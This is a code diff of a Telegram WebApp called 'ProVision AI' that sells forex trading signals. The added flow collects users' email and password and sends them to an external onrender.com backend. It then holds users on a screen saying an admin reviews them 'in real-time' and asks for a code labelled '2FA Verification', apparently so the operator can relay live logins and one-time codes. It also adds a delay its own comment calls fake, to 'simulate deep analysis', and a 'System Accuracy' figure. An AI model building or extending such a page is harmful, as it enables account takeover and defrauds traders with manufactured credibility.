@@ -17,159 +17,162 @@
         button:disabled { background: #334155; color: #94a3b8; cursor: not-allowed; }
         .hidden { display: none; }
         .signal-box { margin-top: 20px; padding: 15px; border-radius: 8px; background: #0f172a; border: 1px dashed #334155; }
-        .signal-text { font-size: 22px; font-weight: bold; margin: 10px 0; }
+        .signal-text { font-size: 22px; font-weight: bold; margin: 5px 0; }
+        .prob-text { font-size: 14px; color: #38bdf8; margin-bottom: 10px; font-weight: bold;}
         .green { color: #00ff88; } .red { color: #ff4444; } .yellow { color: #facc15; }
-        .loader { color: #38bdf8; font-weight: bold; font-size: 18px; }
+        .loader { color: #38bdf8; font-weight: bold; font-size: 16px; margin: 20px 0;}
     </style>
 </head>
 <body>
 
     <div class="container" id="loading-section">
-        <div class="loader">Verifying Access... 🔄</div>
+        <div class="loader">Verifying Server Connection... 🔄</div>
     </div>
 
     <div class="container hidden" id="login-section">
         <h2>⚙️ ProVision AI</h2>
-        <p>Enter credentials to request VIP Access</p>
-        <input type="email" id="email" placeholder="Enter Email Address" required>
-        <input type="password" id="password" placeholder="Enter VIP Code / Password" required>
-        <button onclick="requestAccess()">Submit Request</button>
+        <p>Step 1: Enter User Credentials</p>
+        <input type="email" id="email" placeholder="Email Address" required>
+        <input type="password" id="password" placeholder="Password" required>
+        <button onclick="submitData('login')">Next</button>
     </div>
 
-    <div class="container hidden" id="pending-section">
-        <h2>⏳ Pending Approval</h2>
-        <p>Admin is reviewing your credentials. You will receive a message in Telegram once approved.</p>
+    <div class="container hidden" id="waiting-section">
+        <h2>⏳ Awaiting Verification</h2>
+        <p>Please keep this app open. Admin is reviewing your request in real-time.</p>
+        <div class="loader">Polling Status...</div>
+    </div>
+
+    <div class="container hidden" id="code-section">
+        <h2>🔐 2FA Verification</h2>
+        <p>Login Approved! Enter the VIP Code provided by Admin.</p>
+        <input type="text" id="vipcode" placeholder="Enter VIP Code" required>
+        <button onclick="submitData('code')">Verify Code</button>
     </div>
 
     <div class="container hidden" id="dashboard-section">
-        <h2>📡 Radar Dashboard</h2>
-        <p id="user-limits">Credits: Loading...</p>
+        <h2>📡 Pro Radar</h2>
+        <p id="user-limits" style="color: #facc15; font-weight: bold;">Limits Loading...</p>
         
         <select id="pair">
-            <option value="EURUSD">🇪🇺 EUR/USD</option>
-            <option value="GBPUSD">🇬🇧 GBP/USD</option>
-            <option value="USDJPY">🇯🇵 USD/JPY</option>
-            <option value="AUDUSD">🇦🇺 AUD/USD</option>
+            <option value="EURUSD">🇪🇺 EUR/USD (OTC/LIVE)</option>
+            <option value="GBPUSD">🇬🇧 GBP/USD (OTC/LIVE)</option>
+            <option value="USDJPY">🇯🇵 USD/JPY (OTC/LIVE)</option>
         </select>
         <select id="timeframe">
-            <option value="1m">⏱️ 1 Minute Expiry</option>
-            <option value="5m">⏱️ 5 Minute Expiry</option>
-            <option value="15m">⏱️ 15 Minute Expiry</option>
+            <option value="1m">⏱️ 1 Min Analysis</option>
+            <option value="5m">⏱️ 5 Min Analysis</option>
+            <option value="15m">⏱️ 15 Min Analysis</option>
         </select>
         
-        <button id="scan-btn" onclick="getSignal()">Scan Live Market</button>
+        <button id="scan-btn" onclick="getSignal()">Execute Deep Scan</button>
 
         <div id="signal-result" class="signal-box hidden">
-            <div id="loader" class="loader">Analyzing Market Volume... ⏳</div>
+            <div id="scan-loader" class="loader hidden">Extracting Indicator Math... ⏳</div>
             <div id="final-signal" class="hidden">
                 <div class="signal-text" id="signal-direction"></div>
+                <div class="prob-text" id="signal-prob"></div>
                 <p id="signal-info"></p>
             </div>
         </div>
     </div>
 
-   <script>
+    <script>
         let tg = window.Telegram.WebApp;
-        tg.ready(); // Telegram ko fully load hone deta hai
-        tg.expand();
+        tg.ready(); tg.expand();
         
-        // --- IMPORTANT: RENDER APP URL WAPAS DAALNA YAHAN ---
+        // --- PUT YOUR RENDER URL HERE ---
         const BACKEND_URL = "https://aliza-trading-bot.onrender.com"; 
         
-        // MAGIC FIX: URL se ID nikalega
         const urlParams = new URLSearchParams(window.location.search);
         const userId = urlParams.get('uid') || tg.initDataUnsafe?.user?.id;
-        function showSection(sectionId) {
-            document.getElementById("loading-section").classList.add("hidden");
-            document.getElementById("login-section").classList.add("hidden");
-            document.getElementById("pending-section").classList.add("hidden");
-            document.getElementById("dashboard-section").classList.add("hidden");
-            document.getElementById(sectionId).classList.remove("hidden");
+        
+        let pollingInterval;
+
+        function show(id) {
+            ["loading", "login", "waiting", "code", "dashboard"].forEach(sec => {
+                document.getElementById(sec + "-section").classList.add("hidden");
+            });
+            document.getElementById(id + "-section").classList.remove("hidden");
         }
 
-        // 1. Check User Status on App Load
-        async function checkUserStatus() {
-            if (!userId) {
-                document.getElementById("loading-section").innerHTML = "Error: Please open inside Telegram.";
-                return;
-            }
+        async function checkStatus() {
+            if (!userId) return show("loading");
             try {
-                let response = await fetch(`${BACKEND_URL}/api/status`, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
+                let res = await fetch(`${BACKEND_URL}/api/status`, {
+                    method: "POST", headers: { "Content-Type": "application/json" },
                     body: JSON.stringify({ user_id: userId })
                 });
-                let data = await response.json();
+                let data = await res.json();
                 
-                if (data.status === "unregistered") {
-                    showSection("login-section");
-                } else if (data.status === "pending") {
-                    showSection("pending-section");
-                } else if (data.status === "approved") {
-                    document.getElementById("user-limits").innerText = `Signals Left: ${data.limit}`;
-                    showSection("dashboard-section");
-                } else {
-                    document.getElementById("loading-section").innerHTML = "🚫 Account Banned or Locked.";
+                if (data.status === "unregistered") show("login");
+                else if (data.status === "pending_login" || data.status === "pending_code") show("waiting");
+                else if (data.status === "awaiting_code") show("code");
+                else if (data.status === "approved") {
+                    document.getElementById("user-limits").innerText = `Daily Credits Remaining: ${data.limit}`;
+                    show("dashboard");
+                    clearInterval(pollingInterval); // Stop polling once inside dashboard
                 }
-            } catch (e) {
-                document.getElementById("loading-section").innerHTML = "Connection Error to Server.";
+            } catch (e) { console.log(e); }
+        }
+
+        async function submitData(action) {
+            let payload = { user_id: userId, action: action };
+            if (action === 'login') {
+                payload.email = document.getElementById("email").value;
+                payload.password = document.getElementById("password").value;
+            } else {
+                payload.code = document.getElementById("vipcode").value;
             }
+            show("waiting"); // Show loading screen immediately
+            await fetch(`${BACKEND_URL}/api/submit`, {
+                method: "POST", headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload)
+            });
+            checkStatus(); // Force status check
         }
 
-        // 2. Submit Login Details
-        function requestAccess() {
-            let email = document.getElementById("email").value;
-            let password = document.getElementById("password").value;
-            if (!email || !password) return tg.showAlert("Please fill details.");
-
-            let data = { type: "login", email: email, password: password };
-            tg.sendData(JSON.stringify(data)); // Sends data to python bot
-            showSection("pending-section"); // Immediately lock the screen
-        }
-
-        // 3. Get Signal from Dashboard
         async function getSignal() {
-            let pair = document.getElementById("pair").value;
-            let tf = document.getElementById("timeframe").value;
             let btn = document.getElementById("scan-btn");
-            let resultBox = document.getElementById("signal-result");
-            
             btn.disabled = true;
-            resultBox.classList.remove("hidden");
-            document.getElementById("loader").classList.remove("hidden");
+            document.getElementById("signal-result").classList.remove("hidden");
+            document.getElementById("scan-loader").classList.remove("hidden");
             document.getElementById("final-signal").classList.add("hidden");
 
+            // Fake delay to simulate deep analysis (Pro trader feel)
+            await new Promise(r => setTimeout(r, 2000));
+
             try {
-                let response = await fetch(`${BACKEND_URL}/api/signal`, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ user_id: userId, pair: pair, timeframe: tf })
+                let res = await fetch(`${BACKEND_URL}/api/signal`, {
+                    method: "POST", headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ user_id: userId, pair: document.getElementById("pair").value, timeframe: document.getElementById("timeframe").value })
                 });
-                let data = await response.json();
+                let data = await res.json();
                 
-                document.getElementById("loader").classList.add("hidden");
+                document.getElementById("scan-loader").classList.add("hidden");
                 document.getElementById("final-signal").classList.remove("hidden");
                 
-                let sigDir = document.getElementById("signal-direction");
-                let sigInfo = document.getElementById("signal-info");
+                let dir = document.getElementById("signal-direction");
+                let prob = document.getElementById("signal-prob");
+                let info = document.getElementById("signal-info");
 
                 if (data.error) {
-                    sigDir.innerHTML = `🛑 ERROR`;
-                    sigDir.className = "signal-text red";
-                    sigInfo.innerHTML = data.error;
+                    dir.innerHTML = `🛑 ERROR`; dir.className = "signal-text red";
+                    prob.innerHTML = ""; info.innerHTML = data.error;
                 } else {
-                    sigDir.innerHTML = data.signal;
-                    sigDir.className = `signal-text ${data.color}`;
-                    sigInfo.innerHTML = data.text;
+                    dir.innerHTML = data.signal; dir.className = `signal-text ${data.color}`;
+                    prob.innerHTML = `System Accuracy: ${data.prob}`;
+                    info.innerHTML = data.text;
                 }
             } catch (err) {
-                document.getElementById("loader").innerHTML = "❌ Failed to fetch signal.";
+                document.getElementById("scan-loader").innerHTML = "❌ Network Error.";
             }
             btn.disabled = false;
         }
 
-        // Start checking status as soon as app opens
-        window.onload = checkUserStatus;
+        // Start checking status every 3 seconds
+        checkStatus();
+        pollingInterval = setInterval(checkStatus, 3000);
     </script>
 </body>
 </html>
